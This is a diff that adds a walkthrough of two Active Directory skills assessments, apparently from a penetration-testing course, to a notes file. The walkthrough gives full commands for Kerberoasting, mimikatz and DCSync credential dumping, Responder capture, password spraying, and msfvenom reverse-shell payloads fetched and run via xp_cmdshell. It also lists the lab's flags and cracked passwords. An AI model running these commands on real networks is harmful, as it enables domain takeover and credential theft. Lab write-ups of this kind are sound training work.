@@ -38,6 +38,9 @@
     2. [Attacking Domain Trusts - Cross-Forest Trust Abuse - from linux](#attacking-domain-trusts---cross-forest-trust-abuse---from-linux)
 11. [Defensive Considerations](#defensive-considerations)
     1. [Additional AD Auditing Techniques](#additional-ad-auditing-techniques)
+12. [Skill Assessment - Final Showdown](#skill-assessment---final-showdown)
+    1. [AD Enumeration & Attacks - Skills Assessment Part I](#ad-enumeration--attacks---skills-assessment-part-i)
+    2. [AD Enumeration & Attacks - Skills Assessment Part II](#ad-enumeration--attacks---skills-assessment-part-ii)
 
 ## Initial Enumeration
 ### External Recon and Enumeration Principles
@@ -795,3 +798,417 @@ With this data collected, the attack can be performed with Mimikatz. Here the an
 4. AD Explorer
 
 Those tools can also used for reconnaissance and enumeration phase of Active Directory.
+
+## Skill Assessment - Final Showdown
+### AD Enumeration & Attacks - Skills Assessment Part I
+#### Challenges
+1. Submit the contents of the flag.txt file on the administrator Desktop of the web server
+
+    The challenge statement indicated that we already have shell access in the upload folder. We can check the `/upload` endpoint. In there we can find `antak.aspx`. It gave us system authority. From there, we can get the flag by typing the following command:
+
+    ```powershell
+    type C:\Users\Administrator\Desktop\flag.txt
+    ```
+    The answer is `JusT_g3tt1ng_st@rt3d!`.
+
+2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer
+
+    We can solve this by using `setspn` command. It will gave us the account name.
+
+    ```powershell
+    setspn -Q "MSSQLSvc/SQL01.inlanefreight.local:1433"
+    ```
+    The answer is `svc_sql`.
+
+3. Crack the account's password. Submit the cleartext value.
+
+    First, we need to download `rubeus` onto our attack machine.
+
+    ```bash
+    wget https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/dotnet%20v3.5%20compiled%20binaries/Rubeus.exe
+    ```
+    Then, we upload the executable to the web server via our web shell. In the antak.aspx shell, we can run Rubeus to perform a Kerberoast attack:
+
+    ```powershell
+    C:\Rubeus.exe kerberoast /user:svc_sql /nowrap
+    ```
+    Once we have the hash, we can crack it by using `hashcat` with mode `13100`.
+
+    ```bash
+    hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
+    ```
+    The answer is `lucky7`.
+
+4. Submit the contents of the flag.txt file on the Administrator desktop on MS01
+
+    If we check with `setspn`, we will see that WSMAN is enable in the MS01. The WSMAN SPN means that WinRM (PowerShell Remoting) is enabled on MS01.
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 1.png>)
+
+    Based on this, we can use evil-winrm to connect to MS01. However, because MS01 is on an internal network of the challenge IP, we cant connect directly from our attack machine to MS01. We need to set up port forwarding. Pinging the host `ping -n 1 MS01.inlanefreight.local`reveals its IP address is `172.16.6.50`. We can use `netsh` to forward connection from port `5985` to the `172.16.6.50` (MS01 address). So in the antax shell, we use this command:
+
+    ```powershell
+    netsh interface portproxy add v4tov4 listenport=59850 listenaddress=0.0.0.0 connectport=5985 connectaddress=172.16.6.50
+    ``` 
+    Once the port forward is active, we can return to our attacker host and use `evil-winrm` to connect through the web server's forwarded port:
+
+    ```bash
+    evil-winrm -i 10.129.100.156 -P 59850 -u svc_sql -p 'lucky7'
+    ```
+    We can get the flag by typing this:
+
+    ```bash
+    *Evil-WinRM* PS C:\> type Users\Administrator\Desktop\flag.txt
+    ```
+    The answer is `spn$_r0ast1ng_on_@n_0p3n_f1re`.
+
+5. Find cleartext credentials for another domain user. Submit the username as your answer.
+
+    In here, i just noticed that it will be a lot easier if we use rdp instead of evil-wirnm. So i used `netsh` again to do portforwarding for rdp connection.
+
+    ```powershell
+    netsh interface portproxy add v4tov4 listenport=33890 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.6.50
+    ```
+    Then we can do rdp from the our attack host.
+
+    ```bash
+    xfreerdp /v:10.129.100.156:33890 /u:svc_sql /p:'lucky7' /cert:ignore /dynamic-resolution "/drive:parrotshare,/home/user/parrotshare"
+    ```
+    I tried to use mimikatz. After transfer it via rdp share, i run it. 
+    
+    ```powershell
+    .\mimikatz.exe
+    privilege::debug
+    sekurlsa::logonpasswords
+    ```
+    It gave several account, one of them is `tpetty`. I tried to submit `tpetty` and it is correct.
+
+6. Submit this user's cleartext password.
+
+    Altough it is correct, based on mimikatz output, the password is null. 
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 2.png>)
+
+    After doing some reseacrh, one of the possible reason is because WDigest is disabled. Here the dteail of it based on gemini.
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 3.png>)
+
+    So we need to enabled it and restart the computer.
+
+    ```powershell
+    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\SecurityProviders\WDigest\' -Name 'UseLogonCredential' -Value 1
+    shutdown.exe /r /t 0 /f
+    ```
+
+    Once we have restarted, we can run mimikatz again.
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 4.png>)
+
+    Now we have cleartext password. The asnwer is `Sup3rS3cur3D0m@inU2eR`.
+
+
+7. What attack can this user perform?
+
+    We can solve this by enumerating interesting access for user `tpetty`. In here, i used `PowerView.ps1`.
+
+    ```powershell
+    $tpettysid = Convert-NameToSid tpetty
+    Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $tpettysid} -Verbose
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 5.png>)
+
+    We can see in the `ObjectAceType` section, it has `DS-Replication-Get-Changes`. It is exactly like in the HTB module which can leveraged to perform DCSync Attack. So the answer is `DCSync`.
+
+8. Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01
+
+    By using credential of `tpetty`, we can mimic to get powershell of this user.
+
+    ```powershell
+    runas /netonly /user:INLANEFREIGHT\tpetty powershell
+    ```
+    In the `typetty` shell, we can run mimikatz to get the Administrator hash.
+
+    ```powershell
+    .\mimikatz.exe
+    privilege::debug
+    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part I - 6.png>)
+
+    We got NTLM hash, `27dedb1dab4d8545c6e1c66fba077da0`. Now we can use `win-rm` to DC01. But before this, we need to do portforwarding again. To find the IP of `DC01`, we can ping it.
+
+    ```powershell
+    ping -n 1 DC01.inlanefreight.local
+    ```
+
+    It reveals that the IP of DC01 is `172.16.6.3`. By using this information, we can do portforwarding then.
+
+    ```powershell
+    netsh interface portproxy add v4tov4 listenport=59851 listenaddress=0.0.0.0 connectport=5985 connectaddress=172.16.6.3
+    ```
+
+    After that we can run `evil-winrm` and read the flag.
+
+    ```powershell
+    evil-winrm -i 10.129.80.19 -P 59851 -u Administrator -H '27dedb1dab4d8545c6e1c66fba077da0'
+    ```
+    The answer is `r3plicat1on_m@st3r!`.
+
+### AD Enumeration & Attacks - Skills Assessment Part II
+#### Challenges
+1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
+
+    We can capture the hash by using `responder`.
+
+    ```bash
+    sudo responder -I ens224 
+    ```
+
+    After that go to /usr/share/responder/logs directory. We will find SMB-NTLMv2*.txt file. In there we can find the user that we searched. The answer is backupagent. The answer is `AB920`.
+
+2. What is this user's cleartext password?
+
+    One of the captured hash is like this.
+
+    ```bash
+    AB920::INLANEFREIGHT:e54f4a5bbf72b940:08E60D8A2242489A05CF836E9D47C15B:01010000000000000073FF667B54DC013F2BDE09A16555A200000000020008004B0032005700520001001E00570049004E002D00480041004E005400340058004800480030003400330004003400570049004E002D00480041004E00540034005800480048003000340033002E004B003200570052002E004C004F00430041004C00030014004B003200570052002E004C004F00430041004C00050014004B003200570052002E004C004F00430041004C00070008000073FF667B54DC0106000400020000000800300030000000000000000000000000200000447ECCE9FA8F323B3DAD32E27F6FBB727835F22A7494C4A1FB7FCBB0DB4DA17F0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
+    ```
+    We can save it and crack it by using hashcat.
+
+    ```bash
+    hashcat -m 5600 crack /usr/share/wordlists/rockyou.txt
+    ```
+    The answer is `weasal`.
+
+3. Submit the contents of the C:\flag.txt file on MS01.
+
+    First we need to find IP of MS01. We can do ping sweeping.
+
+    ```bash
+    fping -asgq 172.16.6.0/23
+    ```
+    It gave 4 results. We can use `crackmapexec` to find which one is MS01.
+
+    ```bash
+    crackmapexec smb 172.16.7.3 172.16.7.50 172.16.7.60 -u AB920 -p 'weasal'
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 1.png>)
+
+    We can see the IP of MS01 is `172.16.7.50`. To retrive the flag, we can connect by using rdp. But before it, we need to do port forwarding first. In our attack host, we can try this command:
+
+    ```bash
+    ssh -D 9050 htb-student@10.129.50.99
+    ```
+    Make sure `/etc/proxychains.conf` has this `socks4 	127.0.0.1 9050`. Then we can rdp from our attack host.
+
+    ```bash
+    proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /cert:ignore /dynamic-resolution "/drive:parrotshare,/home/user/parrotshare"
+    ```
+    We can explore and get the flag. The answer is `aud1t_gr0up_m3mbersh1ps!`.
+
+4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
+
+    To solve this, we can use password spraying technique. First, we need to gather valid username.
+
+    ```bash
+    sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users | grep 'INLANEFREIGHT.LOCAL' | awk '{print $5}' > valid_users.txt
+    ```
+
+    Then we can do password spraying.
+
+    ```bash
+    sudo crackmapexec smb 172.16.7.3 -u valid_users.txt -p Welcome1 | grep +
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 2.png>)
+    
+    The answer is `BR086`.
+
+5. What is this user's password?
+
+    Based on the previous image, the answer is `Welcome1`.
+
+6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
+
+    We need to enumerate DC first.
+    
+    ```bash
+    sudo nmap -A 172.16.7.3
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 3.png>)
+
+    We can see that SMB service is running. Then we can enumerate the SMB service.
+
+    ```bash
+    crackmapexec smb 172.16.7.3 -u BR086 -p 'Welcome1' --shares
+    ```
+    One of the share folder is `Department Shares`. We can access that folder by using this command:
+
+    ```bash
+    smbclient //172.16.7.3/"Department Shares" -U INLANEFREIGHT/BR086
+    ```
+    We can find `web.config` file in this path, `\IT\Private\Development`. Then we can get the file by using `get` command.
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 4.png>)
+
+    We can see the credential in there, `netdb:D@ta_bAse_adm1n!`. The answer is `D@ta_bAse_adm1n!`.
+
+7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
+
+    We can login to the SQL01 by using `mssqlclient.py`.
+
+    ```bash
+    mssqlclient.py netdb:'D@ta_bAse_adm1n!'@172.16.7.60 
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 5.png>)
+
+    We can enable `xp_cmdshell` but we cant read the flag. We dont have permission on it. If we check the previllege that we have, we can see that we have `SeImpersonatePrivilege`.
+
+    ```bash
+    EXEC xp_cmdshell 'whoami /priv'
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 6.png>)
+
+    We can exploit this by using `PrinSpoofer64`. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe) tricks the Print Spooler service (which runs as SYSTEM) into connecting back to us. Because the service has SeImpersonatePrivilege, our tool can "impersonate" its SYSTEM token and use it to run our shell.exe payload. We can generate `shell.exe` payload by using `msfvenom`.
+
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe
+    ```
+
+    After we transfer `shell.exe` and `PrinSpoofer64.exe`, We can start `msfconsole` in our pivot host to catch the connection.
+
+    ```bash
+    msf6 > use exploit/multi/handler
+    msf6 exploit(multi/handler) > set LHOST 172.16.7.240
+    msf6 exploit(multi/handler) > set LPORT 1335
+    msf6 exploit(multi/handler) > run
+    ```
+    Then, back to our SQL to download and execute it.
+
+    ```SQL
+    SQL> EXEC xp_cmdshell 'powershell -c "IWR http://172.16.7.240:8000/PrintSpoofer64.exe -OutFile C:\Windows\Tasks\PrintSpoofer64.exe"'
+    SQL> EXEC xp_cmdshell 'powershell -c "IWR http://172.16.7.240:8000/shell.exe -OutFile C:\Windows\Tasks\shell.exe"'
+    SQL> EXEC xp_cmdshell 'C:\Windows\Tasks\PrintSpoofer64.exe -c "C:\Windows\Tasks\shell.exe"'
+    ```
+
+    If it success, our listener will catch it and spawn meterpreter session.
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 7.png>)
+
+    The answer is `s3imp3rs0nate_cl@ssic`.
+
+8. Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
+
+    Still in the meterpreter session, we can use `kiwi` extension.
+
+    ```bash
+    meterpreter > load kiwi
+    ```
+    Then we can dump SAM.
+
+    ```bash
+    meterpreter > lsa_dump_sam
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 8.png>)
+
+    We can see the administrator hash, `bdaffbfe64f1fc646a3353be1c2c3c99`. We can use it to login to MS01 by using `evil-winrm`.
+
+    ```bash
+    evil-winrm -i 172.16.7.50 -u Administrator -H 'bdaffbfe64f1fc646a3353be1c2c3c99'
+    ```
+    The answer is `exc3ss1ve_adm1n_r1ights!`.
+
+9. Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
+
+
+    In here, we need [`PowerView.ps1`](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to get the account with `GenericAll` ActiveDirectoryRights. We can login by using `psexec.py`.
+
+    ```bash
+    psexec.py Administrator@172.16.7.50 -hashes 00000000000000000000000000000000:bdaffbfe64f1fc646a3353be1c2c3c99
+    ```
+
+    Then we can type `powershell.exe` to get the powershell. In the powershell session, we can type this:
+
+    ```powershell
+    Import-Module .\PowerView.ps1
+    Get-DomainObjectACL -Identity "Domain Admins" -DomainController 172.16.7.3 | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" }
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 9.png>)
+
+    In there, we can copy the security-identifier to get the account name.
+
+    ```powershell
+    Get-DomainUser -Identity S-1-5-21-3327542485-274640656-2609762496-4611 -DomainController 172.16.7.3 | Select-Object samaccountname
+    ```
+    The answer is `CT059`.
+
+10. Crack this user's password hash and submit the cleartext password as your answer.
+
+    We can solve this by using [`Inveigh.exe`](https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.11/Inveigh-net4.6.2-v2.0.11.zip). 
+
+    ```powershell
+    .\Inveigh.exe
+    ```
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 10.png>)
+
+    We can see it successfull capture the hash. Then we can crack it by using `hashcat` with mode `5600`.
+
+    ```bash
+    hashcat -m 5600  crack /usr/share/wordlists/rockyou.txt
+    ```
+    The answer is `charlie1`.
+
+11. Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
+
+    Based on question no 9, we know that `CT059` has `GenericAll` property. It makes that `CT059` can add itself to the `Domain Admin` group. We can do this by using `PowerView.ps1`.
+
+    ```powershell
+    Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CT059' -Credential $cred
+    ```
+
+    We can confirm if it success by using this command:
+
+    ```powershell
+    Get-DomainGroupMember -Identity "Domain Admins" | Select MemberName
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 11.png>)
+
+    Once we confirm it, we can use `psexec.py` from our pivot host to read the flag.
+
+    ```bash
+    psexec.py INLANEFREIGHT/CT059:charlie1@172.16.7.3
+    ```
+    The answer is `acLs_f0r_th3_w1n!`.
+
+12. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
+
+    We can solve this by using `mimikatz` or `msfconsole` with `kiwi` extension. In here, i prefer to use `msfconsole`. So we use `psexec` module.
+
+    ```powershell
+    set RHOSTS 172.16.7.3
+    set SMBDomain INLANEFREIGHT
+    set SMBUser CT059
+    set SMBPass charlie1
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST 172.16.7.240
+    set LPORT 4444
+    run
+    ```
+    Once we have meterpreter session, we can do `load kiwi` to use `kiwi` extension. Then we can dump the hash of `krbtgt` account.
+
+    ```powershell
+    meterpreter > kiwi_cmd "lsadump::dcsync /user:krbtgt"
+    ```
+
+    ![alt text](<Assets/AD Enumeration & Attacks - Skills Assessment Part II - 12.png>)
+
+    The answer is `7eba70412d81c1cd030d72a3e8dbe05f`.
